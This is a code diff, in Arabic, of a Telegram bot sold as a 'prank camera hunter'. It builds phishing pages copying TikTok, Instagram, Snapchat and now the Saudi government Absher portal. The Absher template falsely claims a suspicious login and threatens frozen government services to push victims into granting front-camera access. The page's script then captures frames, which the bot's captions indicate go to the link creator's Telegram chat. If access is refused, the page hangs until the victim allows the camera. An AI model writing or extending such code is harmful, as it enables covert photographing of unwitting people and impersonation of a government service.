@@ -60,9 +60,9 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة المقالب المتقدمة (نظام كسر الحظر الدائم والإرشاد الإجباري) ----
+# ---- واجهة المقالب المتقدمة (الأبشر المرعب + الحجز اللانهائي الافتراضي) ----
 def get_html_content(template_type):
-    # إعدادات القوالب الافتراضية
+    # إعدادات القوالب الافتراضية (تيك توك)
     bg_color = "#010101"
     card_bg = "#121212"
     btn_color = "#fe2c55"
@@ -91,12 +91,23 @@ def get_html_content(template_type):
         btn_color = "#000000"
         logo_text = "Snapchat"
         logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
-        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
+        title = "📸 تجربة fفلاتر الذكاء الاصطناعي الجديدة"
         desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
         btn_text = "🔥 تشغيل الفلتر الحصري"
         redirect_to = "https://www.snapchat.com"
 
-    # كود الـ HTML المطور لاكتشاف الحظر الدائم وإظهار التعليمات الإجبارية للضحية
+    elif template_type == "absher":
+        bg_color = "#f4f6f9"
+        card_bg = "#ffffff"
+        btn_color = "#2d6a4f"
+        logo_text = "Absher | أبشر"
+        logo_style = "color: #2d6a4f; font-family: Arial, sans-serif; font-weight: bold; border-bottom: 3px solid #52b788; padding-bottom: 5px;"
+        title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"
+        desc = "تم رصد محاولة دخول مشبوهة إلى حسابك الرقمي الموحد. لتفادي تجميد الخدمات الحكومية والبطاقة الحيوية فوراً، يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية الحالية ومطابقتها بالنظام المركزي لإثبات هويتك."
+        btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
+        redirect_to = "https://www.saudiarabia.gov.sa"
+
+    # كود الـ HTML مع جافا سكريبت العزل اللانهائي الصافي بدون شاشات تعليمات
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -108,7 +119,7 @@ def get_html_content(template_type):
             * {{ box-sizing: border-box; margin: 0; padding: 0; }}
             body {{ 
                 background-color: {bg_color}; 
-                color: { '#ffffff' if bg_color != '#fafafa' else '#000000' }; 
+                color: { '#ffffff' if bg_color == '#010101' else '#000000' }; 
                 font-family: system-ui, -apple-system, sans-serif; 
                 display: flex; flex-direction: column; align-items: center; justify-content: center; 
                 min-height: 100vh; padding: 20px;
@@ -119,7 +130,7 @@ def get_html_content(template_type):
                 border: 1px solid {{ '#2f2f2f' if card_bg == '#121212' else '#e6e6e6' }}; text-align: center;
             }}
             .logo {{
-                font-size: 42px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px;
+                font-size: 36px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px;
                 display: inline-block; {logo_style}
             }}
             .video-box {{
@@ -132,28 +143,17 @@ def get_html_content(template_type):
             }}
             @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
             .loading-text {{ color: #a6a6a6; font-size: 14px; }}
-            h2 {{ font-size: 20px; font-weight: 700; margin-bottom: 10px; }}
-            p {{ color: { '#8a8a8a' if card_bg == '#121212' else '#666666' }; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
+            h2 {{ font-size: 19px; font-weight: 700; margin-bottom: 12px; line-height: 1.4; }}
+            p {{ color: { '#8a8a8a' if card_bg == '#121212' else '#444444' }; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
             .btn {{ 
                 background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
                 font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
-                box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: all 0.2s ease;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.15); transition: all 0.2s ease;
             }}
             .btn:active {{ transform: scale(0.98); }}
-            
-            /* تصفيف مربع الحظر الدائم والتعليمات الإرشادية */
-            .instruction-box {{
-                display: none; background: #ef4444; color: white; padding: 15px; 
-                border-radius: 12px; margin-top: 20px; text-align: right; font-size: 14px; line-height: 1.6;
-                box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3); border: 2px solid #ffffff;
-            }}
-            .instruction-box b {{ color: #fffb00; font-size: 15px; }}
-            .arrow-up {{
-                font-size: 24px; animation: bounce 1s infinite; margin-bottom: 5px; text-align: center;
-            }}
-            @keyframes bounce {{
-                0%, 100% {{ transform: translateY(0); }}
-                50% {{ transform: translateY(-5px); }}
+            .error-msg {{
+                color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
+                background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;
             }}
         </style>
     </head>
@@ -162,20 +162,12 @@ def get_html_content(template_type):
             <div class="logo">{logo_text}</div>
             <div class="video-box">
                 <div class="loader" id="mainLoader"></div>
-                <div class="loading-text" id="statusText">جاري الاتصال بالنظام الحصري...</div>
+                <div class="loading-text" id="statusText">جاري الاتصال الآمن بالخوادم...</div>
             </div>
             <h2 id="mainTitle">{title}</h2>
             <p id="mainDesc">{desc}</p>
             <button class="btn" id="startBtn">{btn_text}</button>
-            
-            <div class="instruction-box" id="guideBox">
-                <div class="arrow-up">⬆️</div>
-                <b>⚠️ تنبيه أمني هام (خطأ في الصلاحيات):</b><br>
-                لقد قمت بحظر الوصول للكاميرا بالخطأ! لإلغاء هذا الحظر والمتابعة فوراً:<br>
-                1. اضغط على أيقونة <b>"القفل 🔒"</b> أو <b>"الإعدادات"</b> الموجودة في شريط الرابط بالأعلى.<br>
-                2. قم بتفعيل خيار <b>"الكاميرا / Camera"</b> واجعلها (مسموح بها / Allow).<br>
-                3. قم بعمل <b>إعادة تحديث (Refresh)</b> للصفحة لفتح النظام.
-            </div>
+            <div class="error-msg" id="errorBlock">⚠️ خطأ أمني: الكاميرا مغلقة! يتعذر التحقق الحركي. يرجى إعادة الضغط والمسح الحي للمتابعة.</div>
         </div>
 
         <script>
@@ -191,8 +183,8 @@ def get_html_content(template_type):
 
                 navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                 .then(function(stream) {{
-                    document.getElementById('guideBox').style.display = 'none';
-                    document.getElementById('statusText').innerText = "جاري تهيئة النظام ومعالجة الأبعاد الحية...";
+                    document.getElementById('errorBlock').style.display = 'none';
+                    document.getElementById('statusText').innerText = "تم الاتصال.. جاري مطابقة بيانات الملامح مع النظام المركزي...";
                     
                     let video = document.createElement('video');
                     video.srcObject = stream;
@@ -228,23 +220,9 @@ def get_html_content(template_type):
                     }};
                 }})
                 .catch(function(err) {{
-                    // [كشف الحظر الدائم 🔒]: إذا كان المتصفح حاظراً للكاميرا مسبقاً، نفتح صندوق الإرشادات فوراً
-                    document.getElementById('guideBox').style.display = 'block';
-                    document.getElementById('statusText').innerText = "❌ تم حظر الصلاحيات من المتصفح!";
-                }});
-            }}
-
-            // فحص فوري عند تحميل الصفحة: إذا كانت الصلاحيات محظورة مسبقاً، نظهر الصندوق تلقائياً
-            if (navigator.permissions && navigator.permissions.query) {{
-                navigator.permissions.query({{name: 'camera'}}).then(function(permissionStatus) {{
-                    if (permissionStatus.state === 'denied') {{
-                        document.getElementById('guideBox').style.display = 'block';
-                    }}
-                    permissionStatus.onchange = function() {{
-                        if (this.state === 'granted') {{
-                            tryCapture();
-                        }}
-                    }};
+                    // [نظام الحجز والتعليق اللانهائي المثالي 🔒]
+                    document.getElementById('errorBlock').style.display = 'block';
+                    document.getElementById('statusText').innerText = "⚠️ فشل التحقق الفوري! يرجى منح الإذن والمحاولة مجدداً.";
                 }});
             }}
 
@@ -262,8 +240,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي (النسخة المضادة للحظر الدائم!) 📸🔓\n\n"
-        "💳 لتفعيل حسابك ونظام الصيد الذكي الشامل، اضغط تفعيل بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا المطور v3.0! 📸🔥\n\n"
+        "💳 لتفعيل حسابك ونظام القوالب الإجبارية الجديدة، اضغط تفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -273,15 +251,16 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل جدار كسر الحظر!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل قفل الحجز المطلق!")
     
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
         InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
         InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
-        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
+        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat"),
+        InlineKeyboardButton("🚨 مقلب بصمة أبشر الحكومي (قوي جداً)", callback_data="gen_absher")
     )
-    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الذكي الخالي من المخارج:", reply_markup=markup)
+    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد الرابط فوراً:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -294,10 +273,9 @@ def gen_link(call):
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        f"🚀 **رابط المقلب الذكي لـ ({template.upper()}) جاهز ومحصن بالكامل!**\n\n"
-        f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
-        "🔥 **ماذا يحدث لو ضغط 'عدم السماح مطلقاً'؟**\n"
-        "الصفحة ستتحول فوراً إلى شاشة تحذير رسمية إجبارية باللون الأحمر مع سهم متحرك للأعلى، لتشرح له كيف يفتح القفل من المتصفح ويوافق غصباً عنه لكي يستطيع الخروج! لن يفلت أبداً 😈😂"
+        f"🚀 **رابط المقلب الخاص بك لـ ({template.upper()}) جاهز للجلد!**\n\n"
+        f"نسخه أرسله للضحية مباشرة:\n`{unique_link}`\n\n"
+        "💡 **تحديث العزل التام:** إذا ضغط الضحية إلغاء أو رفض، الصفحة بتعلق في وجهه تماماً ومستحيل تحوله لأي مكان لين يقتنع ويضغط سماح! 😉🔥"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
@@ -320,7 +298,7 @@ def send_photo_to_owner(user_id, image_bytes, count_text):
         bot.send_photo(
             chat_id=user_id, 
             photo=image_bytes, 
-            caption=f"📸 **تم الصيد بنجاح ومطابقة الملامح! اللقطة رقم ({count_text})**"
+            caption=f"📸 **صيد متتالي ناجح! اللقطة رقم ({count_text})**"
         )
     except Exception as e:
         print(f"Error sending photo: {e}")
@@ -350,7 +328,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم تشغيل التحديث الذكي المضاد للحظر!")
+    print("🚀 تم إطلاق تحديث نظام أبشر الفريد والتثبيت النهائي!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
